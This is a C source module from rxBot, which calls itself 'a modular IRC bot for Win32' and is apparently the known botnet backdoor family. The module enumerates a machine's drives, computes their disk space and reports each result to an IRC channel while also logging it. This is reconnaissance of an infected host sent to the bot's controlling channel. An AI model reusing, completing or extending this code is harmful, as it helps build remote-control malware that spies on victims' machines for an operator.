/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

BOOL FileExists(char *filename, int mode) 
{ 
	return (_access(filename, mode) != -1);
} 

const char *commaI64(unsigned __int64 number)
{
	const int size = 50;
	int counter = 0;

	static char str[size];
	memset(str, 0, sizeof(str));

	char tempStr[size];
	char *ptr1=tempStr, *ptr2;
  
	do {
		*ptr1++ = (char)((number % 10) + '0');
		number /= 10;
		if (number &&  !(++counter % 3))
			*ptr1++ = ',';
	} while(number);
  
	for( --ptr1, ptr2 = str; ptr1 >= tempStr; --ptr1)
		*ptr2++ = *ptr1;
	*ptr2 = '\0';
  
	return (str);
}

const char *DriveType(LPCSTR Drive)
{
	switch(fGetDriveType(Drive)) {
	case DRIVE_UNKNOWN:
		return ("Unknown");
	case DRIVE_NO_ROOT_DIR:
		return ("Invalid");
	case DRIVE_FIXED:
		return ("Disk");
	case DRIVE_REMOTE:
		return ("Network");
	case DRIVE_CDROM:
		return ("Cdrom");
	case DRIVE_RAMDISK:
		return ("RAM");
	default:
		return ("?");
	}
}

DKSP DiskSpace(LPCSTR Drive)
{
	DKSP dksp;
	dksp.AvailableBytes=-1;
	dksp.FreeBytes=-1;
	dksp.TotalBytes=-1;

	if (fGetDiskFreeSpaceEx)
		fGetDiskFreeSpaceEx(Drive,(PULARGE_INTEGER)&dksp.AvailableBytes,
			(PULARGE_INTEGER)&dksp.TotalBytes,(PULARGE_INTEGER)&dksp.FreeBytes);

	return (dksp);
}

DKSPKB DiskSpaceKB(LPCSTR Drive)
{
	DKSPKB dkspkb;
	DKSP dksp=DiskSpace(Drive);

	if(dksp.AvailableBytes == -1 || dksp.FreeBytes == -1 || dksp.TotalBytes == -1) {
		sprintf(dkspkb.AvailableKB, "failed");
		sprintf(dkspkb.FreeKB, "failed");
		sprintf(dkspkb.TotalKB, "failed");
	} else {
		_snprintf(dkspkb.AvailableKB,sizeof(dkspkb.AvailableKB),"%sKB",commaI64(dksp.AvailableBytes/1024));
		_snprintf(dkspkb.FreeKB,sizeof(dkspkb.FreeKB),"%sKB",commaI64(dksp.FreeBytes/1024));
		_snprintf(dkspkb.TotalKB,sizeof(dkspkb.TotalKB),"%sKB",commaI64(dksp.TotalBytes/1024));
	}

	return (dkspkb);
}

void DriveSpace(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive)
{
	char sendbuf[IRCLINE];

	DKSPKB dkspkb=DiskSpaceKB(Drive);

	if (strcmp(dkspkb.TotalKB,"failed") == 0)
		_snprintf(sendbuf, sizeof(sendbuf), "[MAIN]: %s Drive (%s): Failed to stat, device not ready.", DriveType(Drive), Drive);
	else
		_snprintf(sendbuf, sizeof(sendbuf), "[MAIN]: %s Drive (%s): %s total, %s free, %s available.", DriveType(Drive), Drive, dkspkb.TotalKB, dkspkb.FreeKB, dkspkb.AvailableKB);
	irc_privmsg(sock, chan, sendbuf, notice, TRUE); 
	addlog(sendbuf);

	return;
}

void DriveInfo(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive)
{
	if (Drive) {
		DriveSpace(sock, chan, notice, Drive);
	} else {
		DWORD dwSize = fGetLogicalDriveStrings(0, NULL);
		LPSTR pszDrives = (LPSTR)malloc(dwSize + 2);
		fGetLogicalDriveStrings(dwSize + 2,(LPSTR)pszDrives);

		LPCTSTR pszDrv = pszDrives;
		while (*pszDrv) {
			if (strcmp(pszDrv,"A:\\") != 0)
				DriveSpace(sock, chan, notice, pszDrv);
			pszDrv += _tcslen (pszDrv) + 1;
		}
		free(pszDrives);
	}

	return;
}
